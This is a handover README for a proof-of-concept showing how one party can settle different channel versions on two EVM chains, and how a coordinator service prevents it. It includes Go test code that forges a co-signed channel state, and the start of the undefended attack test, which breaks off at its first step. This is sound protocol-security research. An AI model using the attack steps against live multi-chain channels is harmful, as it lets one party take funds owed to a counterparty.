# Multi-Ledger Divergent-Settlement Attack — PoC Handover

This document is the handover for the standalone PoC repository (`multiledger-poc/`)
that demonstrates the multi-ledger divergent-settlement attack against a Perun
state channel and shows how the coordinator service prevents it.

The PoC targets two independent Hardhat EVM chains and uses
[`perun-eth-backend`](https://github.com/perun-network/perun-eth-backend) as the
client library. The defended scenario dials a separately-running
[`cross-chain-coordinator`](.) instance over libp2p.

---

## Table of Contents

- [Multi-Ledger Divergent-Settlement Attack — PoC Handover](#multi-ledger-divergent-settlement-attack--poc-handover)
  - [Table of Contents](#table-of-contents)
  - [1. Background](#1-background)
  - [2. Attack model](#2-attack-model)
    - [Balance setup](#balance-setup)
    - [Steps](#steps)
  - [3. Coordinator protection model](#3-coordinator-protection-model)
  - [4. Prerequisites](#4-prerequisites)
  - [5. Project layout](#5-project-layout)
  - [6. Hardhat chain setup](#6-hardhat-chain-setup)
    - [`hardhat/hardhat.config.js`](#hardhathardhatconfigjs)
    - [`hardhat/scripts/deploy.js`](#hardhatscriptsdeployjs)
    - [Advancing time in tests](#advancing-time-in-tests)
  - [7. Running the coordinator service](#7-running-the-coordinator-service)
    - [7.1 Programmatic API (`cross-chain-coordinator/service`)](#71-programmatic-api-cross-chain-coordinatorservice)
    - [7.2 Configuration shape (`backends.BackendCoordinatorConfig`)](#72-configuration-shape-backendsbackendcoordinatorconfig)
    - [7.3 Production CLI (optional)](#73-production-cli-optional)
  - [8. Contract reference](#8-contract-reference)
  - [9. Go module setup](#9-go-module-setup)
  - [10. PoC implementation](#10-poc-implementation)
    - [10.1 Chain helpers](#101-chain-helpers)
    - [10.2 Participant setup with coordinator notifier](#102-participant-setup-with-coordinator-notifier)
    - [10.3 Helper: `buildSecretSignedReq`](#103-helper-buildsecretsignedreq)
    - [10.4 Attack test — no coordinator](#104-attack-test--no-coordinator)
    - [10.5 Defended test — coordinator over libp2p](#105-defended-test--coordinator-over-libp2p)
  - [11. Running the PoC](#11-running-the-poc)
    - [Expected output](#expected-output)
  - [12. Key invariants](#12-key-invariants)
    - [Timing diagram (defended scenario)](#timing-diagram-defended-scenario)

---

## 1. Background

A **multi-ledger channel** is a Perun payment channel whose assets live on two
separate EVM chains. Each chain hosts its own `Adjudicator.sol` and
`AssetHolderETH.sol`, and maintains its own dispute window. The two adjudicators
have no direct communication path — that independence is what the attack
exploits.

```
Chain A (port 8545, chainID 1337)     Chain B (port 8546, chainID 1338)
─────────────────────────────────     ─────────────────────────────────
Adjudicator_A  AssetHolderETH_A       Adjudicator_B  AssetHolderETH_B
      │  Asset1 (ETH on Chain A)             │  Asset2 (ETH on Chain B)
      └──────────── multi-ledger channel (logical) ────────────────────┘
                        Alice ←——————→ Bob
```

---

## 2. Attack model

### Balance setup

| Version                                 | Alice A1 | Bob A1 | Alice A2 | Bob A2 | Bob total |
| --------------------------------------- | -------- | ------ | -------- | ------ | --------- |
| v0 (init)                               | 8 ETH    | 2 ETH  | 2 ETH    | 8 ETH  | 10        |
| v1 (agreed)                             | 5        | 5      | 3        | 7      | 12        |
| v2 (secret)                             | 1        | 9      | 5        | 5      | 14        |
| **Attack outcome** (v2 on A1, v1 on A2) | **1**    | **9**  | **3**    | **7**  | **16**    |

Bob profits **+4** above the honest v1 baseline by registering different
versions on each chain.

### Steps

```
t0  Alice & Bob agree on v1 off-chain. Bob secretly retains both signatures for
    a fabricated v2 (Alice never sees it); Alice's local machine stays at v1.
t1  Bob registers v1 on Chain B.        (Chain B dispute window opens at v1.)
t2  Chain B challenge window expires.   (v1 frozen on Chain B.)
t3  Bob registers v2 on Chain A.        (Chain A had no prior registration → v2 accepted.)
t4  Chain A challenge window expires.   (v2 frozen on Chain A.)
t5  Bob withdraws v2 on Chain A → 9 ETH (Asset1).
    Bob withdraws v1 on Chain B → 7 ETH (Asset2).
    Alice receives 1 + 3 = 4 ETH instead of 5 + 3 = 8 ETH.
```

Each `Adjudicator.registerSingle` only checks that the new version exceeds
whatever is registered **on that chain**. There is no global synchronisation
forcing a single canonical version across chains.

---

## 3. Coordinator protection model

A trusted third-party (TTP) coordinator `C` is encoded into the channel
parameters at open time via `client.WithCoordinator(...)`. The on-chain phase
lifecycle becomes:

```
register()   ──► DISPUTE      (any participant, per chain, challenge window opens)
[timeout]    ──► FROZEN       (window expires; registerSingle rejects new states)
coordinate() ──► COORDINATED  (coordinator only, after dispute timeout has passed,
                               selects the highest-version canonical state)
conclude()   ──► CONCLUDED    (any participant, funds released)
```

What the coordinator does:

1. Subscribe to on-chain events for the channel on **every** registered chain.
2. Wait until each chain delivers a `RegisteredEvent` whose timeout has elapsed.
3. Pick the **highest version** seen across all chains as the canonical state.
4. Call `multi.Coordinator.Coordinate(canonical)` — fans out concurrently to all chains.
5. Each chain's `coordinateSingle` accepts the canonical version (≥ its stored
   version) and transitions to `COORDINATED`. Once `COORDINATED`,
   `registerSingle` rejects any further state submission.

**Guarantee:** both chains lock to the same version before any withdrawal. Even
if Bob registered v2 on Chain A while Chain B stayed at v1, the coordinator
coordinates v2 on both chains so the payout is uniform.

---

## 4. Prerequisites

| Tool    | Version  | Purpose                                       |
| ------- | -------- | --------------------------------------------- |
| Go      | ≥ 1.24   | PoC implementation                            |
| Node.js | ≥ 18     | Hardhat                                       |
| Hardhat | ≥ 2.22   | Two local EVM chains                          |
| solc    | ≥ 0.8.15 | Compile contracts (`pragma solidity ^0.8.15`) |

Go dependencies:

```
github.com/perun-network/perun-eth-backend           # Ethereum adjudicator/funder/wallet
perun.network/go-perun                                # framework — fork pinned via replace
github.com/ethereum/go-ethereum v1.17.2               # ethclient, accounts
github.com/libp2p/go-libp2p                           # for the coordinator peer.ID type
github.com/miguelmota/go-ethereum-hdwallet v0.1.1     # Hardhat mnemonic key derivation
github.com/stretchr/testify v1.11.1                   # assertions
polycry.pt/poly-go                                    # sync primitives
```

The coordinator-enabled `Adjudicator.sol` from
`perun-eth-backend/bindings/contracts/` must be deployed on both chains.
Pre-compiled ABI/bytecode lives in `bindings/adjudicator/`; regenerate Go
bindings with `cd perun-eth-backend/bindings && ./generate.sh`.

---

## 5. Project layout

```
multiledger-poc/                    ← this PoC repository
├── hardhat/
│   ├── hardhat.config.js
│   ├── contracts/                  copy from perun-eth-backend/bindings/contracts/
│   ├── scripts/deploy.js
│   └── addresses.json              filled by deploy.js (git-ignored)
│
├── poc/
│   ├── helpers.go                  ChainConfig, key derivation, time advance
│   ├── participant.go              Participant type (client + per-chain handles)
│   ├── attack_test.go              TestAttackNoCoordinator
│   └── coordinator_test.go         TestAttackWithCoordinator
│
├── go.mod
└── go.sum

cross-chain-coordinator/            ← sibling repo (this directory)
                                     run separately; the PoC dials it over libp2p
```

---

## 6. Hardhat chain setup

### `hardhat/hardhat.config.js`

```javascript
require("@nomicfoundation/hardhat-toolbox");

module.exports = {
  solidity: "0.8.26",
  networks: {
    chainA: {
      url: "http://127.0.0.1:8545",
      chainId: 1337,
      accounts: { mnemonic: "test test test test test test test test test test test junk", count: 5 },
    },
    chainB: {
      url: "http://127.0.0.1:8546",
      chainId: 1338,
      accounts: { mnemonic: "test test test test test test test test test test test junk", count: 5 },
    },
  },
};
```

Account indices: `[0]` deployer, `[1]` Alice, `[2]` Bob, `[3]` Charlie
(coordinator).

Start both chains in separate terminals (each must expose a WebSocket endpoint
so the coordinator can `SubscribeNewHead`):

```bash
npx hardhat node --port 8545        # Chain A — exposes ws://127.0.0.1:8545
npx hardhat node --port 8546        # Chain B — exposes ws://127.0.0.1:8546
```

### `hardhat/scripts/deploy.js`

```javascript
const { ethers, network } = require("hardhat");
const fs = require("fs");

async function main() {
  const Adj   = await ethers.getContractFactory("Adjudicator");
  const Asset = await ethers.getContractFactory("AssetHolderETH");

  const adj   = await Adj.deploy();   await adj.waitForDeployment();
  const asset = await Asset.deploy(await adj.getAddress()); await asset.waitForDeployment();

  const out = { adjudicator: await adj.getAddress(), assetHolder: await asset.getAddress() };
  const path = "addresses.json";
  const prev = fs.existsSync(path) ? JSON.parse(fs.readFileSync(path)) : {};
  prev[network.name] = out;
  fs.writeFileSync(path, JSON.stringify(prev, null, 2));
  console.log(network.name, out);
}
main().catch(console.error);
```

```bash
cd hardhat
npx hardhat run scripts/deploy.js --network chainA
npx hardhat run scripts/deploy.js --network chainB
# → addresses.json updated with chainA and chainB entries
```

### Advancing time in tests

`Adjudicator.sol` uses `block.timestamp` (seconds) for dispute timeouts.
`challengeDuration` in `channel.Params` is also seconds. Tests advance the
chain clock via the standard EVM JSON-RPC methods:

```go
// AdvanceTime mines one block after increasing the node's clock by `seconds`.
func AdvanceTime(ctx context.Context, rpcURL string, seconds uint64) error {
    c, err := rpc.DialContext(ctx, rpcURL)
    if err != nil { return err }
    defer c.Close()
    if err := c.CallContext(ctx, nil, "evm_increaseTime", hexutil.EncodeUint64(seconds)); err != nil {
        return fmt.Errorf("evm_increaseTime: %w", err)
    }
    return c.CallContext(ctx, nil, "evm_mine")
}
```

With `challengeDuration = 15 s`, call `AdvanceTime(ctx, rpcURL, 16)` to expire
the window.

---

## 7. Running the coordinator service

The coordinator is the sibling repo `cross-chain-coordinator/`. The PoC's
defended test **constructs it in-process** using `service.New(...)` — the
coordinator still connects to the libp2p relay and accepts client
notifications over circuit streams, but no separate terminal / env vars are
required. The CLI in `cross-chain-coordinator/main.go` is only used for
production deployments.

### 7.1 Programmatic API (`cross-chain-coordinator/service`)

```go
package service

// New wires the ETH backend and starts the libp2p relay coordinator.
//   coordinators is the per-chain config (chain URL, adjudicator address).
//   signingKey is the ECDSA key used to sign coordinator certificates on-chain.
//   libp2pKey  is the stable identity key for this coordinator's peer.ID.
func New(
    coordinators []backends.BackendCoordinatorConfig,
    signingKey   *ecdsa.PrivateKey,
    libp2pKey    libp2pcrypto.PrivKey,
) (*Service, error)

// Service embeds *coordinator.CoordinatorHost (Wait, stopWatching, etc.).
type Service struct {
    *coordinator.CoordinatorHost
}
func (s *Service) PeerID() peer.ID                         // for RelayCoordinatorNotifier
func (s *Service) Close() error                            // shut down libp2p host + relay reservation
func (s *Service) Wait(timeout time.Duration) error        // drain in-flight coordinate() calls
```

What `New` does internally:

1. `backends.SetupMultiCoordinator` builds `*multi.Coordinator` plus the
   coordinator's `wallet.Account` (one `*ethchannel.Coordinator` per chain in
   `coordinators`).
2. `coordinator.SetupRelayCoordinator` brings up a libp2p host with no listen
   addresses, dials the Perun relay (`relay.perun.network:5574`, peer ID
   `QmcxeYpYpYPX4J3478YZUaxFytYfUDbNe1jUWVYeZjL3gY`), reserves a slot (renewed
   every 4 min), and registers three stream handlers
   (`/coordinator/notify-watch-{ledger,sub,stop}/1.0.0`).
3. The returned `Service.PeerID()` is the address clients must dial via
   `RelayCoordinatorNotifier(acc, peerID)`.

### 7.2 Configuration shape (`backends.BackendCoordinatorConfig`)

```go
type BackendCoordinatorConfig struct {
    BackendID       uint32 // ethwallet.BackendID == 1
    LedgerID        uint64 // chain ID, e.g. 1337
    ChainURL        string // MUST be ws:// or wss://
    AdjudicatorAddr string // deployed Adjudicator address on this chain
}
```

`backends.Config.Validate` (called by `LoadConfig`) enforces non-empty
`private_key_path`, at least one coordinator entry, unique
`(BackendID, LedgerID)` pairs, `ChainURL` starting with `ws://` or `wss://`,
and non-empty `AdjudicatorAddr`. The PoC's test constructs the slice directly
in Go (see §10.5), so YAML loading is only relevant for the production CLI.

**The ECDSA key's derived ETH address is what the PoC must embed via
`client.WithCoordinator(...)`** at channel-open time. Charlie's key (account
index `3` from the Hardhat mnemonic) is the convention used by the PoC; pass
the same key to `service.New` as `signingKey`.

The libp2p key is independent of the ECDSA key and determines the service's
`peer.ID`. In tests, generate it fresh with
`libp2pcrypto.GenerateKeyPair(libp2pcrypto.RSA, 2048)` — every test run gets
a new peer.ID, but that's fine because both clients in the test read the
peer.ID from `svc.PeerID()`.

### 7.3 Production CLI (optional)

For deployments outside the PoC, the CLI in `cross-chain-coordinator/main.go`
loads the same config from YAML and stays alive until SIGINT:

```bash
cd cross-chain-coordinator
go run . -mode keygen -keyfile sign_private.key                            # one-time libp2p key
openssl rand -hex 32 > coord_ecdsa.key                                     # one-time ECDSA key
go run . -mode relay -keyfile sign_private.key -config devnet_config.yaml  # logs the peer.ID at startup
```

`devnet_config.yaml` shape mirrors the `BackendCoordinatorConfig` slice above:

```yaml
private_key_path: ./coord_ecdsa.key
coordinators:
  - backend_id: 1
    ledger_id: 1337
    chainURL: "ws://127.0.0.1:8545"
    adjudicator_addr: "0xDEADBEEF..."
  - backend_id: 1
    ledger_id: 1338
    chainURL: "ws://127.0.0.1:8546"
    adjudicator_addr: "0xCAFEBABE..."
```

---

## 8. Contract reference

The PoC uses Go bindings generated from `Adjudicator.sol`. Function signatures:

```solidity
struct SignedState { Channel.Params params; Channel.State state; bytes[] sigs; }

function register(SignedState memory channel, SignedState[] memory subChannels) external;
function coordinate(SignedState memory channel, SignedState[] memory subChannels, bytes[] memory coordSigs) external;
function conclude(Channel.Params memory params, Channel.State memory state, Channel.State[] memory subStates) external;
function concludeFinal(Channel.Params memory params, Channel.State memory state, bytes[] memory sigs) external;
```

`Channel.Params` (from `Channel.sol`):

```solidity
struct Params {
    uint256       challengeDuration;
    uint256       nonce;
    Participant[] participants;
    address       app;
    bool          ledgerChannel;
    bool          virtualChannel;
    address       coordinator;          // address(0) if no coordinator
}
```

Coordinator signature verified by
`Sig.verify(abi.encode(state), coordSigs[i], params.coordinator)` — matches
go-perun's `channel.Sign(coordAcc, state, ethBackendID)`.

Multi-ledger eligibility (`MultiLedger.sol`): coordination is required only
when `params.coordinator != address(0)` AND the state has assets on more than
one chain (`isMultiLedgerState`). Single-chain channels with a coordinator set
behave as normal single-ledger channels.

Key revert reasons (raised through `errors.Wrapf(ErrTxFailed, ...)`):

| Check                                                  | Revert message                      |
| ------------------------------------------------------ | ----------------------------------- |
| `coordinate()` requires prior `register()`             | `"not registered"`                  |
| `coordinate()` requires `block.timestamp ≥ timeout`    | `"refutation timeout not passed"`   |
| `coordinate()` requires valid coordinator ECDSA sig    | `"invalid coordinator signature"`   |
| `coordinate()` requires state version ≥ stored version | `"invalid version"`                 |
| `register()` in COORDINATED phase                      | `"incorrect phase"`                 |
| Multi-ledger `conclude()` without coordination         | `"coordinated settlement required"` |

---

## 9. Go module setup

```
module github.com/your-org/multiledger-poc

go 1.24

require (
    github.com/perun-network/perun-eth-backend  v0.0.0  // replace below
    perun.network/go-perun                      v0.15.1-0.20260408121133-2daea3fa699a
    github.com/ethereum/go-ethereum             v1.17.2
    github.com/libp2p/go-libp2p                 v0.48.0
    github.com/miguelmota/go-ethereum-hdwallet  v0.1.1
    github.com/stretchr/testify                 v1.11.1
    polycry.pt/poly-go                          v0.0.0-20220301085937-fb9d71b45a37
)

replace (
    // go-perun fork: CoordinatorSubscriber, CoordinatedEvent,
    // ErrChannelAlreadyConcluded, and the runtime-peer-ID
    // RelayCoordinatorNotifier constructor.
    perun.network/go-perun => github.com/NhoxxKienn/go-perun v0.0.0-20260526062537-a05990e2cb40

    github.com/perun-network/perun-eth-backend =>
        github.com/NhoxxKienn/perun-eth-backend v0.6.1-0.20260525091241-e1f6c19121e0
)
```

Versions must match what `cross-chain-coordinator/go.mod` uses; otherwise the
`peer.ID` types or `RelayCoordinatorNotifier` constructor signature will not
line up.

---

## 10. PoC implementation

### 10.1 Chain helpers

```go
// poc/helpers.go
package poc

import (
    "context"
    "crypto/ecdsa"
    "encoding/json"
    "fmt"
    "math/big"
    "os"

    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/common/hexutil"
    "github.com/ethereum/go-ethereum/core/types"
    "github.com/ethereum/go-ethereum/ethclient"
    "github.com/ethereum/go-ethereum/rpc"
    hdwallet "github.com/miguelmota/go-ethereum-hdwallet"
)

type ChainConfig struct {
    RPC       string
    ChainID   *big.Int
    Client    *ethclient.Client
    AdjAddr   common.Address
    AssetAddr common.Address
}

func NewChainConfig(rpcURL string, chainID int64, adjAddr, assetAddr string) (*ChainConfig, error) {
    c, err := ethclient.Dial(rpcURL)
    if err != nil { return nil, err }
    return &ChainConfig{
        RPC: rpcURL, ChainID: big.NewInt(chainID), Client: c,
        AdjAddr: common.HexToAddress(adjAddr), AssetAddr: common.HexToAddress(assetAddr),
    }, nil
}

func MakeSigner(chainID *big.Int) types.Signer { return types.LatestSignerForChainID(chainID) }

func AdvanceTime(ctx context.Context, rpcURL string, seconds uint64) error {
    c, err := rpc.DialContext(ctx, rpcURL)
    if err != nil { return err }
    defer c.Close()
    if err := c.CallContext(ctx, nil, "evm_increaseTime", hexutil.EncodeUint64(seconds)); err != nil {
        return fmt.Errorf("evm_increaseTime: %w", err)
    }
    return c.CallContext(ctx, nil, "evm_mine")
}

const hardhatMnemonic = "test test test test test test test test test test test junk"

func DeriveKey(index uint32) (*ecdsa.PrivateKey, error) {
    w, err := hdwallet.NewFromMnemonic(hardhatMnemonic)
    if err != nil { return nil, err }
    path := hdwallet.MustParseDerivationPath(fmt.Sprintf("m/44'/60'/0'/0/%d", index))
    acc, err := w.Derive(path, false)
    if err != nil { return nil, err }
    return w.PrivateKey(acc)
}

func LoadChains() (chainA, chainB *ChainConfig, err error) {
    data, err := os.ReadFile("../hardhat/addresses.json")
    if err != nil { return nil, nil, fmt.Errorf("reading addresses.json: %w", err) }
    var addrs struct {
        ChainA struct { Adjudicator, AssetHolder string } `json:"chainA"`
        ChainB struct { Adjudicator, AssetHolder string } `json:"chainB"`
    }
    if err := json.Unmarshal(data, &addrs); err != nil {
        return nil, nil, fmt.Errorf("parsing addresses.json: %w", err)
    }
    chainA, err = NewChainConfig("http://127.0.0.1:8545", 1337, addrs.ChainA.Adjudicator, addrs.ChainA.AssetHolder)
    if err != nil { return nil, nil, err }
    chainB, err = NewChainConfig("http://127.0.0.1:8546", 1338, addrs.ChainB.Adjudicator, addrs.ChainB.AssetHolder)
    return chainA, chainB, err
}

// ethBalanceReader reads the native ETH balance of one account on one chain.
type ethBalanceReader struct {
    client *ethclient.Client
    addr   common.Address
}
func newETHBalanceReader(c *ethclient.Client, a common.Address) *ethBalanceReader { return &ethBalanceReader{c, a} }
func (r *ethBalanceReader) Balance() *big.Int {
    bal, err := r.client.BalanceAt(context.Background(), r.addr, nil)
    if err != nil { return big.NewInt(0) }
    return bal
}
```

### 10.2 Participant setup with coordinator notifier

```go
// poc/participant.go
package poc

import (
    "crypto/ecdsa"
    "math/big"
    "os"
    "testing"

    "github.com/ethereum/go-ethereum/accounts"
    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/crypto"
    "github.com/libp2p/go-libp2p/core/peer"
    "github.com/stretchr/testify/require"

    ethchannel    "github.com/perun-network/perun-eth-backend/channel"
    ethwallet     "github.com/perun-network/perun-eth-backend/wallet"
    simplewallet  "github.com/perun-network/perun-eth-backend/wallet/simple"
    "perun.network/go-perun/channel"
    "perun.network/go-perun/channel/multi"
    "perun.network/go-perun/client"
    "perun.network/go-perun/wallet"
    "perun.network/go-perun/watcher/local"
    "perun.network/go-perun/wire"
    libp2pwire    "perun.network/go-perun/wire/net/libp2p"
    wiretest      "perun.network/go-perun/wire/test"
    "polycry.pt/poly-go/test"
)

const (
    ethBackendID      = wallet.BackendID(ethwallet.BackendID) // == 1
    gasLimit          = uint64(1_000_000)
    challengeDuration = uint64(15) // ETH backend interprets ChallengeDuration as seconds
)

type BalanceReader interface{ Balance() *big.Int }

type Participant struct {
    Client      *client.Client
    WireAddr    map[wallet.BackendID]wire.Address
    WalletAddr  map[wallet.BackendID]wallet.Address
    WalletAcc   map[wallet.BackendID]wallet.Account
    AdjA, AdjB  *ethchannel.Adjudicator
    BalA, BalB  BalanceReader
    ethAccount  accounts.Account
}

func (p *Participant) HandleAdjudicatorEvent(_ channel.AdjudicatorEvent) {}

// NewParticipant builds a fully-wired participant. When coordPeerID is
// non-empty, it installs a RelayCoordinatorNotifier so NotifyWatch* fires
// automatically when ProposeChannel / sub-channel-open / Close happens.
// Pass "" for the no-coordinator attack test.
func NewParticipant(t *testing.T, key *ecdsa.PrivateKey, bus wire.Bus, chainA, chainB *ChainConfig, coordPeerID peer.ID) *Participant {
    t.Helper()
    rng := test.Prng(t)

    w   := simplewallet.NewWallet(key)
    addr := ethwallet.Address(crypto.PubkeyToAddress(key.PublicKey))
    acc, err := w.Unlock(&addr)
    require.NoError(t, err)
    ethAcc := accounts.Account{Address: addr.Address}

    cbA := ethchannel.NewContractBackend(chainA.Client, ethchannel.MakeChainID(chainA.ChainID),
        simplewallet.NewTransactor(w, MakeSigner(chainA.ChainID)), 1)
    cbB := ethchannel.NewContractBackend(chainB.Client, ethchannel.MakeChainID(chainB.ChainID),
        simplewallet.NewTransactor(w, MakeSigner(chainB.ChainID)), 1)

    adjA := ethchannel.NewAdjudicator(cbA, chainA.AdjAddr, addr.Address, ethAcc, gasLimit)
    adjB := ethchannel.NewAdjudicator(cbB, chainB.AdjAddr, addr.Address, ethAcc, gasLimit)

    mAdj := multi.NewAdjudicator()
    mAdj.RegisterAdjudicator(ethchannel.MakeLedgerBackendID(chainA.ChainID), adjA)
    mAdj.RegisterAdjudicator(ethchannel.MakeLedgerBackendID(chainB.ChainID), adjB)

    assetA := ethchannel.NewAsset(chainA.ChainID, chainA.AssetAddr)
    assetB := ethchannel.NewAsset(chainB.ChainID, chainB.AssetAddr)

    funderA := ethchannel.NewFunder(cbA)
    funderA.RegisterAsset(*assetA, ethchannel.NewETHDepositor(gasLimit), ethAcc)
    funderA.RegisterAsset(*assetB, ethchannel.NewNoOpDepositor(), ethAcc)
    funderB := ethchannel.NewFunder(cbB)
    funderB.RegisterAsset(*assetA, ethchannel.NewNoOpDepositor(), ethAcc)
    funderB.RegisterAsset(*assetB, ethchannel.NewETHDepositor(gasLimit), ethAcc)

    mFund := multi.NewFunder()
    mFund.RegisterFunder(ethchannel.MakeLedgerBackendID(chainA.ChainID), funderA)
    mFund.RegisterFunder(ethchannel.MakeLedgerBackendID(chainB.ChainID), funderB)

    watcher, err := local.NewWatcher(mAdj)
    require.NoError(t, err)

    wireAddr   := wiretest.NewRandomAddressesMap(rng, 1)
    perunWallet := map[wallet.BackendID]wallet.Wallet{ethBackendID: w}
    c, err := client.New(wireAddr[0], bus, mFund, mAdj, perunWallet, watcher)
    require.NoError(t, err)

    // Install the relay notifier BEFORE any ProposeChannel.
    if coordPeerID != "" {
        libp2pAcc, err := libp2pwire.NewAccount(key /* + your dialer/listener config */)
        require.NoError(t, err)
        c.EnableCoordinationNotifier(libp2pwire.NewRelayCoordinatorNotifier(libp2pAcc, coordPeerID))
    }

    return &Participant{
        Client: c, WireAddr: wireAddr[0],
        WalletAddr: map[wallet.BackendID]wallet.Address{ethBackendID: &addr},
        WalletAcc:  map[wallet.BackendID]wallet.Account{ethBackendID: acc},
        AdjA: adjA, AdjB: adjB,
        BalA: newETHBalanceReader(chainA.Client, addr.Address),
        BalB: newETHBalanceReader(chainB.Client, addr.Address),
        ethAccount: ethAcc,
    }
}

// StartCoordinator constructs a CoordinatorHost in-process using
// service.New(...). It dials the libp2p relay, reserves a slot, and registers
// the three NotifyWatch* stream handlers. Returns the peer.ID and ETH address
// the test must pass to RelayCoordinatorNotifier and WithCoordinator
// respectively, plus the Service handle for shutdown.
//
// Hardhat mnemonic account index 3 is the convention used for Charlie.
func StartCoordinator(t *testing.T, chainA, chainB *ChainConfig) (*service.Service, peer.ID, common.Address) {
    t.Helper()

    charlieKey, err := DeriveKey(3)
    require.NoError(t, err)

    libp2pKey, _, err := libp2pcrypto.GenerateKeyPair(libp2pcrypto.RSA, 2048)
    require.NoError(t, err)

    cfg := []backends.BackendCoordinatorConfig{
        {BackendID: 1, LedgerID: chainA.ChainID.Uint64(),
            ChainURL: toWS(chainA.RPC), AdjudicatorAddr: chainA.AdjAddr.Hex()},
        {BackendID: 1, LedgerID: chainB.ChainID.Uint64(),
            ChainURL: toWS(chainB.RPC), AdjudicatorAddr: chainB.AdjAddr.Hex()},
    }
    svc, err := service.New(cfg, charlieKey, libp2pKey)
    require.NoError(t, err)

    t.Cleanup(func() {
        _ = svc.Wait(30 * time.Second) // drain in-flight coordinate() calls
        _ = svc.Close()
    })

    return svc, svc.PeerID(), crypto.PubkeyToAddress(charlieKey.PublicKey)
}

// toWS rewrites a Hardhat http:// RPC URL into the ws:// URL that the
// coordinator requires (SubscribeNewHead does not work over HTTP).
func toWS(rpcURL string) string {
    if strings.HasPrefix(rpcURL, "http://") {
        return "ws://" + strings.TrimPrefix(rpcURL, "http://")
    }
    if strings.HasPrefix(rpcURL, "https://") {
        return "wss://" + strings.TrimPrefix(rpcURL, "https://")
    }
    return rpcURL
}
```

The extra imports needed for `StartCoordinator`:

```go
import (
    "strings"

    libp2pcrypto "github.com/libp2p/go-libp2p/core/crypto"

    "cross-chain-coordinator/backends"
    "cross-chain-coordinator/service"
)
```

> `simplewallet.NewWallet(key)` accepts any number of `*ecdsa.PrivateKey`
> values. `w.Unlock(&addr)` returns the `wallet.Account` for that address.
> `NewRelayCoordinatorNotifier(acc, coordPeerID)` is the runtime-peer-ID
> constructor introduced in the go-perun fork pinned above.

### 10.3 Helper: `buildSecretSignedReq`

Bypasses the normal `client.Update` flow to fabricate a state both parties have
signed but Alice never received off the wire — simulating a key-extraction or
side-channel attack.

```go
// poc/attack_test.go
package poc_test

import (
    "fmt"

    "perun.network/go-perun/channel"
    "perun.network/go-perun/wallet"
)

func buildSecretSignedReq(
    baseReq    channel.AdjudicatorReq,
    newBalances channel.Balances,
    accs       []wallet.Account,
    bID        wallet.BackendID,
    idx        channel.Index,
) (channel.AdjudicatorReq, error) {
    s := baseReq.Tx.State.Clone()
    s.Version  = baseReq.Tx.State.Version + 1
    s.Balances = newBalances

    sigs := make([]wallet.Sig, len(accs))
    for i, a := range accs {
        sig, err := channel.Sign(a, s, bID)
        if err != nil { return channel.AdjudicatorReq{}, fmt.Errorf("signing party %d: %w", i, err) }
        sigs[i] = sig
    }
    return channel.AdjudicatorReq{
        Params: baseReq.Params,
        Acc:    map[wallet.BackendID]wallet.Account{bID: accs[idx]},
        Tx:     channel.Transaction{State: s, Sigs: sigs},
        Idx:    idx,
    }, nil
}
```

### 10.4 Attack test — no coordinator

Demonstrates the vulnerability: without a coordinator, divergent settlement
SUCCEEDS.

```go
// poc/attack_test.go (continued)
package poc_test

import (
    "context"
    "math/big"
    "testing"
    "time"

    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
    "perun.network/go-perun/channel"
    "perun.network/go-perun/client"
    "perun.network/go-perun/wallet"
    "perun.network/go-perun/wire"
    ctest        "perun.network/go-perun/client/test"
    ethchannel   "github.com/perun-network/perun-eth-backend/channel"

    poc "github.com/your-org/multiledger-poc/poc"
)

var (
    initBals = channel.Balances{{ether(8), ether(2)}, {ether(2), ether(8)}}
    v1Bals   = channel.Balances{{ether(5), ether(5)}, {ether(3), ether(7)}}
    v2Bals   = channel.Balances{{ether(1), ether(9)}, {ether(5), ether(5)}}
    balanceDelta = ether(0.001) // gas tolerance
)

func ether(e float64) *big.Int {
    f := new(big.Float).SetFloat64(e); f.Mul(f, new(big.Float).SetFloat64(1e18))
    i, _ := f.Int(nil); return i
}

func TestAttackNoCoordinator(t *testing.T) {
    ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
    defer cancel()
    require := require.New(t)
    assert  := assert.New(t)

    chainA, chainB, err := poc.LoadChains();           require.NoError(err)
    bus := wire.NewLocalBus()

    aliceKey, err := poc.DeriveKey(1); require.NoError(err)
    bobKey,   err := poc.DeriveKey(2); require.NoError(err)
    alice := poc.NewParticipant(t, aliceKey, bus, chainA, chainB, "") // no coordinator
    bob   := poc.NewParticipant(t, bobKey,   bus, chainA, chainB, "")

    assetA := ethchannel.NewAsset(chainA.ChainID, chainA.AssetAddr)
    assetB := ethchannel.NewAsset(chainB.ChainID, chainB.AssetAddr)
    bID1   := wallet.BackendID(assetA.LedgerBackendID().BackendID())

    parts := []map[wallet.BackendID]wire.Address{alice.WireAddr, bob.WireAddr}
    initAlloc := channel.NewAllocation(2,
        []wallet.BackendID{bID1, wallet.BackendID(assetB.LedgerBackendID().BackendID())},
        assetA, assetB)
    initAlloc.Balances = initBals

    prop, err := client.NewLedgerChannelProposal(challengeDuration, alice.WalletAddr, initAlloc, parts)
    require.NoError(err)

    chans := make(chan *client.Channel, 1); errs := make(chan error, 2)
    go alice.Client.Handle(ctest.AlwaysRejectChannelHandler(ctx, errs), ctest.AlwaysAcceptUpdateHandler(ctx, errs))
    go bob.Client.Handle(ctest.AlwaysAcceptChannelHandler(ctx, bob.WalletAddr, chans, errs), ctest.AlwaysAcceptUpdateHandler(ctx, errs))

    chAliceBob, err := alice.Client.ProposeChannel(ctx, prop)
    require.NoError(err)
    var chBobAlice *client.Channel
    select {
    case chBobAlice = <-chans:
    case err := <-errs: t.Fatalf("channel open: %v", err)
    }

    // Legitimate v1.
    done := make(chan struct{}, 1)
    chBobAlice.OnUpdate(func(_, _ *channel.State) { done <- struct{}{} })
    require.NoError(chAliceBob.Update(ctx, func(s *channel.State) { s.Balances = v1Bals }))
    <-done; time.Sleep(100 * time.Millisecond)

    v1ReqAlice := client.NewTestChannel(chAliceBob).AdjudicatorReq()
    v1ReqBob   := client.NewTestChannel(chBobAlice).AdjudicatorReq()

    accs := []wallet.Account{alice.WalletAcc[bID1], bob.WalletAcc[bID1]}
    v2ReqBob,   err := buildSecretSignedReq(v1ReqBob,   v2Bals, accs, bID1, 1); require.NoError(err)
    v2ReqAlice, err := buildSecretSignedReq(v1ReqAlice, v2Bals, accs, bID1, 0); require.NoError(err)

    chID := chAliceBob.ID()

    // STEP 1: Bob registers v1 on Chain B and waits out the window.
